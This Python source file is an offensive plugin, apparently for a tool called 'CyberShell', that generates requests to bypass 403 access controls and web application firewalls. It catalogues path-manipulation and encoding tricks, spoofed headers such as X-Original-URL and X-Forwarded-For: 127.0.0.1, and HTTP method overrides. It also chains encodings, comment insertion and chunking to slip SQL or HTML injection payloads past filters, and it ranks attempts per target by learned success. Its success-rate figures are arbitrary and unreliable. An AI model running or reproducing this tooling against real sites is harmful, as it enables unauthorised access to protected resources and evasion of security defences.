import urllib.parse
import base64
import json
from typing import List, Dict, Any, Optional, Tuple
from enum import Enum
import re
import itertools
from dataclasses import dataclass

class BypassCategory(Enum):
    """Categories of bypass techniques"""
    PATH_MANIPULATION = "Path Manipulation"
    ENCODING = "Encoding Techniques"
    HEADER_INJECTION = "Header Injection"
    METHOD_OVERRIDE = "HTTP Method Override"
    PROTOCOL_ABUSE = "Protocol Abuse"
    PARSER_DIFFERENTIAL = "Parser Differential"
    UNICODE = "Unicode Bypass"
    CASE_VARIATION = "Case Variation"

@dataclass
class BypassPayload:
    """Structure for bypass payloads"""
    category: BypassCategory
    name: str
    technique: str
    description: str
    example: str
    success_rate: float = 0.5
    applicable_to: List[str] = None

class AdvancedBypassGenerator:
    """Advanced bypass payload generator"""
    
    def __init__(self):
        self.bypass_techniques = self._initialize_techniques()
        
    def _initialize_techniques(self) -> Dict[BypassCategory, List[BypassPayload]]:
        """Initialize comprehensive bypass techniques"""
        
        techniques = {
            BypassCategory.PATH_MANIPULATION: [
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Double Slash",
                    technique="//",
                    description="Double slash before path",
                    example="/admin -> //admin",
                    success_rate=0.6,
                    applicable_to=["nginx", "apache"]
                ),
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Path Traversal",
                    technique="..//",
                    description="Path traversal with double slash",
                    example="/admin -> /..//admin",
                    success_rate=0.5,
                    applicable_to=["nginx"]
                ),
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Trailing Slash",
                    technique="/",
                    description="Add trailing slash",
                    example="/admin -> /admin/",
                    success_rate=0.4,
                    applicable_to=["apache", "nginx"]
                ),
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Dot Segment",
                    technique="/./",
                    description="Insert dot segments",
                    example="/admin -> /./admin",
                    success_rate=0.5,
                    applicable_to=["all"]
                ),
                BypassPayload(
                    category=BypassCategory.PATH_MANIPULATION,
                    name="Multiple Slashes",
                    technique="///",
                    description="Multiple slashes",
                    example="/admin -> ///admin",
                    success_rate=0.4,
                    applicable_to=["nginx"]
                ),
            ],
            
            BypassCategory.ENCODING: [
                BypassPayload(
                    category=BypassCategory.ENCODING,
                    name="URL Encoding",
                    technique="%2F",
                    description="URL encode slashes",
                    example="/admin -> %2Fadmin",
                    success_rate=0.7,
                    applicable_to=["all"]
                ),
                BypassPayload(
                    category=BypassCategory.ENCODING,
                    name="Double URL Encoding",
                    technique="%252F",
                    description="Double URL encode",
                    example="/admin -> %252Fadmin",
                    success_rate=0.6,
                    applicable_to=["apache", "iis"]
                ),
                BypassPayload(
                    category=BypassCategory.ENCODING,
                    name="Unicode Encoding",
                    technique="%C0%AF",
                    description="Unicode encoded slash",
                    example="/admin -> %C0%AFadmin",
                    success_rate=0.5,
                    applicable_to=["iis"]
                ),
                BypassPayload(
                    category=BypassCategory.ENCODING,
                    name="UTF-8 Encoding",
                    technique="%EF%BC%8F",
                    description="UTF-8 fullwidth slash",
                    example="/admin -> %EF%BC%8Fadmin",
                    success_rate=0.5,
                    applicable_to=["nginx", "apache"]
                ),
            ],
            
            BypassCategory.HEADER_INJECTION: [
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="X-Original-URL",
                    technique="X-Original-URL",
                    description="Override URL via header",
                    example="X-Original-URL: /admin",
                    success_rate=0.7,
                    applicable_to=["nginx", "cloudflare"]
                ),
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="X-Rewrite-URL",
                    technique="X-Rewrite-URL",
                    description="Rewrite URL via header",
                    example="X-Rewrite-URL: /admin",
                    success_rate=0.6,
                    applicable_to=["nginx"]
                ),
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="X-Forwarded-For",
                    technique="X-Forwarded-For",
                    description="Spoof source IP",
                    example="X-Forwarded-For: 127.0.0.1",
                    success_rate=0.5,
                    applicable_to=["all"]
                ),
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="X-Custom-IP-Authorization",
                    technique="X-Custom-IP-Authorization",
                    description="Custom IP auth header",
                    example="X-Custom-IP-Authorization: 127.0.0.1",
                    success_rate=0.4,
                    applicable_to=["custom"]
                ),
                BypassPayload(
                    category=BypassCategory.HEADER_INJECTION,
                    name="Referer Override",
                    technique="Referer",
                    description="Trusted referer bypass",
                    example="Referer: http://localhost/admin",
                    success_rate=0.3,
                    applicable_to=["all"]
                ),
            ],
            
            BypassCategory.METHOD_OVERRIDE: [
                BypassPayload(
                    category=BypassCategory.METHOD_OVERRIDE,
                    name="Method Override Header",
                    technique="X-HTTP-Method-Override",
                    description="Override HTTP method",
                    example="X-HTTP-Method-Override: GET",
                    success_rate=0.5,
                    applicable_to=["all"]
                ),
                BypassPayload(
                    category=BypassCategory.METHOD_OVERRIDE,
                    name="Alternative Methods",
                    technique="TRACE",
                    description="Use TRACE method",
                    example="TRACE /admin HTTP/1.1",
                    success_rate=0.4,
                    applicable_to=["apache"]
                ),
                BypassPayload(
                    category=BypassCategory.METHOD_OVERRIDE,
                    name="Custom Method",
                    technique="GETS",
                    description="Custom HTTP method",
                    example="GETS /admin HTTP/1.1",
                    success_rate=0.3,
                    applicable_to=["misconfigured"]
                ),
            ],
            
            BypassCategory.UNICODE: [
                BypassPayload(
                    category=BypassCategory.UNICODE,
                    name="Unicode Normalization",
                    technique="\uFF0F",
                    description="Unicode fullwidth slash",
                    example="/admin -> \uFF0Fadmin",
                    success_rate=0.5,
                    applicable_to=["nginx", "apache"]
                ),
                BypassPayload(
                    category=BypassCategory.UNICODE,
                    name="Unicode Non-characters",
                    technique="\uFFF0",
                    description="Unicode non-characters",
                    example="/admin\uFFF0",
                    success_rate=0.3,
                    applicable_to=["custom"]
                ),
            ],
        }
        
        return techniques
    
    def generate_bypass_payloads(self, original_path: str, 
                                category: Optional[BypassCategory] = None) -> List[Dict[str, Any]]:
        """Generate bypass payloads for a given path"""
        payloads = []
        
        # Get techniques to apply
        if category:
            techniques_to_apply = self.bypass_techniques.get(category, [])
        else:
            techniques_to_apply = []
            for tech_list in self.bypass_techniques.values():
                techniques_to_apply.extend(tech_list)
        
        # Apply each technique
        for technique in techniques_to_apply:
            payload = self._apply_technique(original_path, technique)
            payloads.append({
                "original": original_path,
                "modified": payload,
                "technique": technique.name,
                "category": technique.category.value,
                "description": technique.description,
                "success_rate": technique.success_rate
            })
        
        return payloads
    
    def _apply_technique(self, path: str, technique: BypassPayload) -> str:
        """Apply a specific bypass technique to a path"""
        
        if technique.category == BypassCategory.PATH_MANIPULATION:
            if technique.technique == "//":
                return "/" + path
            elif technique.technique == "..//":
                return "/../" + path
            elif technique.technique == "/":
                return path if path.endswith("/") else path + "/"
            elif technique.technique == "/./":
                return "/./" + path.lstrip("/")
            elif technique.technique == "///":
                return "//" + path
                
        elif technique.category == BypassCategory.ENCODING:
            if technique.technique == "%2F":
                return path.replace("/", "%2F")
            elif technique.technique == "%252F":
                return path.replace("/", "%252F")
            elif technique.technique == "%C0%AF":
                return path.replace("/", "%C0%AF")
            elif technique.technique == "%EF%BC%8F":
                return path.replace("/", "%EF%BC%8F")
                
        elif technique.category == BypassCategory.UNICODE:
            if technique.technique == "\uFF0F":
                return path.replace("/", "\uFF0F")
        
        return path
    
    def generate_combinatorial_bypasses(self, path: str, max_combinations: int = 3) -> List[str]:
        """Generate combinations of bypass techniques"""
        results = []
        all_techniques = []
        
        for tech_list in self.bypass_techniques.values():
            all_techniques.extend(tech_list)
        
        # Generate combinations
        for r in range(1, min(max_combinations + 1, len(all_techniques) + 1)):
            for combo in itertools.combinations(all_techniques, r):
                modified_path = path
                for technique in combo:
                    modified_path = self._apply_technique(modified_path, technique)
                
                if modified_path != path:
                    results.append(modified_path)
        
        return list(set(results))  # Remove duplicates

class WAFBypassEngine:
    """WAF bypass engine with multiple evasion techniques"""
    
    def __init__(self):
        self.generator = AdvancedBypassGenerator()
        self.encoding_chains = self._initialize_encoding_chains()
    
    def _initialize_encoding_chains(self) -> List[List[str]]:
        """Initialize encoding chains for multi-layer encoding"""
        return [
            ["url", "url"],  # Double URL encoding
            ["url", "unicode"],  # URL then Unicode
            ["unicode", "url"],  # Unicode then URL
            ["base64", "url"],  # Base64 then URL
            ["html", "url"],  # HTML entity then URL
        ]
    
    def encode_payload(self, payload: str, encoding_type: str) -> str:
        """Apply specific encoding to payload"""
        if encoding_type == "url":
            return urllib.parse.quote(payload)
        elif encoding_type == "url_double":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding_type == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding_type == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == "html":
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding_type == "hex":
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        else:
            return payload
    
    def apply_encoding_chain(self, payload: str, chain: List[str]) -> str:
        """Apply a chain of encodings"""
        result = payload
        for encoding in chain:
            result = self.encode_payload(result, encoding)
        return result
    
    def generate_waf_evasion_payloads(self, payload: str) -> List[Dict[str, str]]:
        """Generate WAF evasion variants of a payload"""
        evasions = []
        
        # Case variations
        evasions.append({
            "technique": "case_variation",
            "payload": self._random_case(payload),
            "description": "Random case variation"
        })
        
        # Whitespace insertion
        evasions.append({
            "technique": "whitespace",
            "payload": self._insert_whitespace(payload),
            "description": "Whitespace insertion"
        })
        
        # Comment insertion (for SQL/HTML)
        evasions.append({
            "technique": "comments",
            "payload": self._insert_comments(payload),
            "description": "Comment insertion"
        })
        
        # Encoding chains
        for chain in self.encoding_chains:
            encoded = self.apply_encoding_chain(payload, chain)
            evasions.append({
                "technique": f"encoding_chain_{'-'.join(chain)}",
                "payload": encoded,
                "description": f"Encoding chain: {' -> '.join(chain)}"
            })
        
        # Chunking
        evasions.append({
            "technique": "chunking",
            "payload": self._chunk_payload(payload),
            "description": "Payload chunking"
        })
        
        return evasions
    
    def _random_case(self, text: str) -> str:
        """Randomize case of text"""
        import random
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
    
    def _insert_whitespace(self, text: str) -> str:
        """Insert whitespace characters"""
        # Insert tabs and spaces
        result = text.replace(" ", "\t")
        result = result.replace("=", " = ")
        return result
    
    def _insert_comments(self, text: str) -> str:
        """Insert comments for SQL/HTML contexts"""
        if "<" in text and ">" in text:
            # HTML context
            return text.replace(">", "><!--comment-->")
        elif "SELECT" in text.upper() or "UNION" in text.upper():
            # SQL context
            return text.replace(" ", "/**/")
        else:
            return text
    
    def _chunk_payload(self, text: str, chunk_size: int = 10) -> str:
        """Chunk payload with concatenation"""
        if len(text) <= chunk_size:
            return text
        
        chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
        # Use concatenation appropriate for the context
        if "<" in text:
            return "".join(chunks)  # HTML
        else:
            return "' + '".join(f"'{chunk}'" for chunk in chunks)  # String concat

class RequestManipulator:
    """Manipulate HTTP requests for bypass attempts"""
    
    def __init__(self):
        self.bypass_generator = AdvancedBypassGenerator()
        self.waf_engine = WAFBypassEngine()
    
    def generate_bypass_requests(self, base_request: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate multiple bypass variations of a request"""
        bypass_requests = []
        
        # Extract base components
        method = base_request.get("method", "GET")
        path = base_request.get("path", "/")
        headers = base_request.get("headers", {}).copy()
        params = base_request.get("params", {})
        
        # Path-based bypasses
        path_bypasses = self.bypass_generator.generate_bypass_payloads(path)
        for bypass in path_bypasses:
            request = {
                "method": method,
                "path": bypass["modified"],
                "headers": headers.copy(),
                "params": params.copy(),
                "bypass_technique": bypass["technique"],
                "success_rate": bypass["success_rate"]
            }
            bypass_requests.append(request)
        
        # Header-based bypasses
        header_bypasses = [
            {"X-Original-URL": path},
            {"X-Rewrite-URL": path},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-HTTP-Method-Override": "GET"},
            {"X-Method-Override": "GET"},
        ]
        
        for header_bypass in header_bypasses:
            bypass_headers = headers.copy()
            bypass_headers.update(header_bypass)
            request = {
                "method": method,
                "path": path,
                "headers": bypass_headers,
                "params": params.copy(),
                "bypass_technique": f"header_{list(header_bypass.keys())[0]}",
                "success_rate": 0.5
            }
            bypass_requests.append(request)
        
        # Method-based bypasses
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"]
        for bypass_method in methods:
            if bypass_method != method:
                request = {
                    "method": bypass_method,
                    "path": path,
                    "headers": headers.copy(),
                    "params": params.copy(),
                    "bypass_technique": f"method_{bypass_method}",
                    "success_rate": 0.3
                }
                bypass_requests.append(request)
        
        # Parameter pollution
        if params:
            polluted_params = params.copy()
            for key in params.keys():
                polluted_params[key] = [params[key], params[key]]  # Duplicate parameter
            
            request = {
                "method": method,
                "path": path,
                "headers": headers.copy(),
                "params": polluted_params,
                "bypass_technique": "parameter_pollution",
                "success_rate": 0.4
            }
            bypass_requests.append(request)
        
        return bypass_requests
    
    def rank_bypass_attempts(self, bypass_requests: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Rank bypass attempts by likelihood of success"""
        return sorted(bypass_requests, key=lambda x: x.get("success_rate", 0), reverse=True)

class SmartBypassOrchestrator:
    """Intelligent orchestrator for bypass attempts"""
    
    def __init__(self):
        self.manipulator = RequestManipulator()
        self.success_history = {}
        self.failed_techniques = set()
        
    def learn_from_attempt(self, technique: str, success: bool, target: str):
        """Learn from bypass attempt results"""
        key = f"{target}_{technique}"
        
        if success:
            self.success_history[key] = self.success_history.get(key, 0) + 1
        else:
            self.failed_techniques.add(key)
    
    def get_optimized_bypass_sequence(self, target: str, 
                                     base_request: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate optimized sequence of bypass attempts"""
        
        # Generate all possible bypasses
        all_bypasses = self.manipulator.generate_bypass_requests(base_request)
        
        # Filter out known failures
        filtered = []
        for bypass in all_bypasses:
            technique = bypass.get("bypass_technique", "")
            if f"{target}_{technique}" not in self.failed_techniques:
                filtered.append(bypass)
        
        # Boost successful techniques
        for bypass in filtered:
            technique = bypass.get("bypass_technique", "")
            key = f"{target}_{technique}"
            if key in self.success_history:
                bypass["success_rate"] = min(1.0, bypass["success_rate"] + 0.1 * self.success_history[key])
        
        # Rank and return
        return self.manipulator.rank_bypass_attempts(filtered)
    
    def export_successful_techniques(self) -> Dict[str, List[str]]:
        """Export successful techniques for future use"""
        successful = {}
        
        for key, count in self.success_history.items():
            if count > 0:
                target, technique = key.rsplit("_", 1)
                if target not in successful:
                    successful[target] = []
                successful[target].append({
                    "technique": technique,
                    "success_count": count
                })
        
        return successful

# Integration with CyberShell
class BypassPlugin:
    """Plugin to integrate bypass techniques with CyberShell"""
    
    def __init__(self, config):
        self.config = config
        self.orchestrator = SmartBypassOrchestrator()
        self.waf_engine = WAFBypassEngine()
        
    def generate_403_bypasses(self, url: str) -> List[Dict]:
        """Generate 403 bypass attempts for a URL"""
        from urllib.parse import urlparse
        
        parsed = urlparse(url)
        base_request = {
            "method": "GET",
            "path": parsed.path or "/",
            "headers": {},
            "params": {}
        }
        
        bypasses = self.orchestrator.get_optimized_bypass_sequence(
            parsed.netloc,
            base_request
        )
        
        return bypasses
    
    def generate_waf_evasions(self, payload: str) -> List[Dict]:
        """Generate WAF evasion variants"""
        return self.waf_engine.generate_waf_evasion_payloads(payload)
    
    def update_learning(self, target: str, technique: str, success: bool):
        """Update learning from attempt results"""
        self.orchestrator.learn_from_attempt(technique, success, target)
    
    def get_statistics(self) -> Dict:
        """Get bypass statistics"""
        return {
            "successful_techniques": self.orchestrator.export_successful_techniques(),
            "failed_attempts": len(self.orchestrator.failed_techniques),
            "total_successes": sum(self.orchestrator.success_history.values())
        }
